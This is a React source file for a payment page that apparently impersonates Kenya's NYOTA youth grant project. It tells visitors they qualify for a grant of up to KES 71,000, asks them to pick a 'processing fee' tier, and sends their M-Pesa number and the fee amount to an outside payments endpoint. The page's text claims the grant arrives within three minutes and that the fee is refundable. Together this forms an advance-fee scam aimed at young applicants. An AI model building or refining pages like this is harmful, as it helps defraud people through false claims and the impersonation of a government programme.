import { useEffect, useState } from "react";
import { ArrowRight, Info } from "lucide-react";
import logo from "/src/assets/Nyotalogo.png";
import Topbar from "./Topbar";
import { PageLoader } from "./Loader";

const FEE_TIERS = [
  { id: "tier1", range: "KES 22,240", fee: "KES 240", sh: 240 },
  { id: "tier2", range: "KES 32,330", fee: "KES 330", sh: 330 },
  { id: "tier3", range: "KES 50,450", fee: "KES 450", sh: 450 },
  { id: "tier4", range: "KES 71,620", fee: "KES 620", sh: 620 },
];

export default function ProcessingFee() {
  const [selectedTier, setSelectedTier] = useState("");
  const [error, setError] = useState("");
  const [phoneError, setPhoneError] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [loading, setLoading] = useState("");
  const selectedFee = FEE_TIERS.find((t) => t.id === selectedTier);
  const amount = selectedFee?.sh;

  const handleSelect = (id) => {
    setSelectedTier(id);
    if (error) setError("");
  };

  const handleProceed = async () => {
    if (!selectedTier) {
      setError("Please select the grant amount that applies to you.");
      return;
    }

    if (!phoneNumber.trim()) {
      setPhoneError("Please enter your M-Pesa phone number.");
      return;
    }

    if (!/^0\d{9}$/.test(phoneNumber.trim())) {
      setPhoneError("Enter a valid M-Pesa number (07XXXXXXXX).");
      return;
    }

    setError("");
    setPhoneError("");
    setLoading(true);

    try {
      const response = await fetch("https://nyotaf.onrender.com/api/payments", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phoneNumber,
          amount: amount,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || "Payment failed.");
      }

      // Payment request sent successfully
      // navigate("/processing");
    } catch (error) {
      console.error(error);
      setError(error.message);
    } finally {
    }
  };

  return (
    <>
      <div
        className={`min-h-screen bg-white text-stone-900 sm:py-16 transition-all ${
          loading ? "blur-sm pointer-events-none select-none" : ""
        }`}
      >
        <div className="min-h-screen bg-white text-stone-900 sm:py-16">
          <Topbar />

          <img src={logo} alt="Nyota Logo" />

          <div className="mx-auto max-w-2xl px-5">
            <div>
              <h1 className="ml-4 font-serif text-2xl font-semibold text-black">
                Processing Fees
              </h1>
              <p className="ml-4 mt-1 text-sm color-b ">
                Congratulations! Based on your application, you qualify for a
                grant of up to <strong>KES 71,000.</strong>
              </p>

              <div className="space-y-6 px-6 py-8 sm:px-10">
                <fieldset>
                  <legend className="mb-4 text-xs font-semibold uppercase tracking-wider text-stone-500">
                    Grant Amount &amp; Processing Fee
                  </legend>

                  <div className="overflow-hidden rounded-xl border border-stone-300">
                    <div className="grid grid-cols-2 bg-stone-100 px-4 py-2.5 text-xs font-semibold uppercase tracking-wide text-stone-500">
                      <span>Grant Amount</span>
                      <span>Processing Fee</span>
                    </div>

                    {FEE_TIERS.map((tier, idx) => {
                      const selected = selectedTier === tier.id;
                      return (
                        <button
                          key={tier.id}
                          type="button"
                          onClick={() => handleSelect(tier.id)}
                          className={`grid w-full grid-cols-2 items-center border-t border-stone-200 px-4 py-3.5 text-left text-sm transition ${
                            selected
                              ? "bg-emerald-50 text-emerald-800 ring-1 ring-inset ring-emerald-700/30"
                              : "bg-white text-stone-700 hover:bg-stone-50"
                          } ${idx === 0 ? "border-t-0" : ""}`}
                        >
                          <span className="font-medium">{tier.range}</span>
                          <span
                            className={
                              selected
                                ? "font-semibold text-emerald-700"
                                : "text-stone-600"
                            }
                          >
                            {tier.fee}
                          </span>
                        </button>
                      );
                    })}
                  </div>

                  {error && (
                    <span className="mt-2 block text-xs font-medium text-red-600">
                      {error}
                    </span>
                  )}
                </fieldset>

                <div className="rounded-xl border border-stone-300 p-4 space-y-4">
                  <h3 className="text-sm font-semibold text-stone-800">
                    Payment Details
                  </h3>

                  <div>
                    <input
                      type="tel"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      placeholder="Mpesa Number"
                      className="w-full rounded-lg border border-stone-300 px-4 py-3 outline-none focus:border-green-600"
                    />
                    {phoneError && (
                      <span className="mt-2 block text-xs font-medium text-red-600">
                        {phoneError}
                      </span>
                    )}
                  </div>

                  <div className="rounded-lg bg-stone-100 px-4 py-3 flex items-center justify-between">
                    <span className="text-sm text-stone-600">
                      Amount to Pay
                    </span>
                    <span className="font-semibold text-green-700">
                      {selectedFee ? selectedFee.fee : "Select a grant amount"}
                    </span>
                  </div>
                </div>
                <div className="flex gap-2 rounded-xl border border-gray-300 bg-blue-50 px-4 py-3 text-xs color-b">
                  <Info className="mt-0.5 h-4 w-4 shrink-0" />
                  <p>
                    Remember: You Will Receive Your <strong>NYOTA</strong> Fund
                    In Less Than 3 Minutes After Your Processing Fee Has Been
                    Apprroved.The Processing Fee Is <strong>REFUNDABLE</strong>,
                    And Will Be Refunded Upon Grant Disbursement.
                  </p>
                </div>

                <button
                  type="button"
                  onClick={handleProceed}
                  className="inline-flex w-full items-center justify-center gap-2 rounded-full bg-green-700 px-7 py-3.5 text-sm font-semibold text-stone-50 shadow-sm transition hover:bg-emerald-900"
                >
                  Proceed to Payment
                  <ArrowRight className="h-4 w-4" />
                </button>

                <p className="text-center text-xs text-stone-400">
                  The Official Website | Copyright © 2026. National Youth
                  Opportunities Towards Advancement (NYOTA) Project.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
      {loading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/20 backdrop-blur-sm">
          <PageLoader
            message="Waiting for Payment"
            subtext="Page will refresh once your payment is received."
          />
        </div>
      )}
    </>
  );
}
